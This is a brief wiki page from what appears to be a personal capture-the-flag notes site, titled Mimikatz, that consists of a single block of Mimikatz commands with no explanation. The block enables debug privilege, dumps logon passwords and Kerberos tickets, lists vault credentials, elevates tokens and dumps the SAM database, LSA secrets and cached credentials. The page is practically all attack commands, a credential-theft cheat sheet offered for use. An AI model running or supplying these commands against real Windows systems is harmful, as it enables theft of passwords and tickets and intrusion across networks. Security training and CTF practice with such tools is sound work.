---
layout: article
title: Mimikatz
permalink: /wikis/ctf/mimikatz
aside:
    toc: true
sidebar:
    nav: ctf
---

Extracting information from <b>mimikatz</b> 

```
log 
privilege::debug 
sekurlsa::logonpasswords 
sekurlsa::tickets /export 

vault::cred 
vault::list 

token::elevate 
vault::cred 
vault::list 
lsadump::sam 
lsadump::secrets 
lsadump::cache
```